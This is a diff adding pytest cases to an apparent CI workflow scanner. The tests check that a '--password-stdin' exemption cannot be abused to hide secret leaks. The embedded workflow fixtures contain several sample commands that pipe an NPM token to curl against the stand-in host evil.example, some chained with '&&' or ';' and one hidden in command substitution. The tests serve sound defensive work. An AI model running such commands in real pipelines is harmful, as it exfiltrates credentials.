@@ -651,3 +651,117 @@ jobs:
     hits = scan_target(tmp_path, [], [])
     assert len(hits) == 1
     assert hits[0].sink_kind == "untrusted_action"
+
+
+def test_password_stdin_exemption_requires_known_consumer(
+    tmp_path: Path,
+) -> None:
+    """``sh -c 'curl -d @- https://evil.example' --password-stdin``
+    exfiltrates (sh -c ignores trailing args as $0) — a trailing
+    ``--password-stdin`` on an arbitrary command must not buy the
+    exemption."""
+    _write_wf(tmp_path, "evil.yml", """\
+name: x
+on: [push]
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env:
+      TOKEN: ${{ secrets.NPM_TOKEN }}
+    steps:
+      - run: echo "$TOKEN" | sh -c 'curl -d @- https://evil.example' --password-stdin
+""")
+    hits = scan_target(tmp_path, [], [])
+    assert any(h.sink_kind == "run_block" for h in hits)
+
+
+def test_password_stdin_exemption_rejects_command_substitution(
+    tmp_path: Path,
+) -> None:
+    _write_wf(tmp_path, "evil.yml", """\
+name: x
+on: [push]
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env:
+      TOKEN: ${{ secrets.NPM_TOKEN }}
+    steps:
+      - run: echo "$TOKEN" | docker login $(curl https://evil.example) --password-stdin
+""")
+    hits = scan_target(tmp_path, [], [])
+    assert any(h.sink_kind == "run_block" for h in hits)
+
+
+def test_password_stdin_exemption_covers_helm_registry_login(
+    tmp_path: Path,
+) -> None:
+    _write_wf(tmp_path, "ok.yml", """\
+name: x
+on: [push]
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env:
+      TOKEN: ${{ secrets.REGISTRY_TOKEN }}
+    steps:
+      - run: echo "$TOKEN" | helm registry login registry.example.org -u bot --password-stdin
+""")
+    hits = scan_target(tmp_path, [], [])
+    assert not any(h.sink_kind == "run_block" for h in hits)
+
+
+def test_password_stdin_exemption_rejects_command_riders(
+    tmp_path: Path,
+) -> None:
+    """The exemption covers the exact single-command shape only —
+    ``&& <exfil>`` riding the same line must not inherit it."""
+    _write_wf(tmp_path, "evil.yml", """\
+name: x
+on: [push]
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env:
+      TOKEN: ${{ secrets.NPM_TOKEN }}
+    steps:
+      - run: echo "$TOKEN" | docker login -u bot --password-stdin && echo "$TOKEN" | curl -d @- https://evil.example
+""")
+    hits = scan_target(tmp_path, [], [])
+    assert any(h.sink_kind == "run_block" for h in hits)
+
+
+def test_password_stdin_exemption_rejects_prefix_riders(
+    tmp_path: Path,
+) -> None:
+    _write_wf(tmp_path, "evil.yml", """\
+name: x
+on: [push]
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env:
+      TOKEN: ${{ secrets.NPM_TOKEN }}
+    steps:
+      - run: curl -d "$TOKEN" https://evil.example; echo "$TOKEN" | docker login --password-stdin
+""")
+    hits = scan_target(tmp_path, [], [])
+    assert any(h.sink_kind == "run_block" for h in hits)
+
+
+def test_password_stdin_trailing_registry_host_still_exempt(
+    tmp_path: Path,
+) -> None:
+    _write_wf(tmp_path, "ok.yml", """\
+name: x
+on: [push]
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env:
+      TOKEN: ${{ secrets.REGISTRY_TOKEN }}
+    steps:
+      - run: echo "$TOKEN" | docker login -u ${{ github.actor }} --password-stdin ghcr.io
+""")
+    hits = scan_target(tmp_path, [], [])
+    assert not any(h.sink_kind == "run_block" for h in hits)
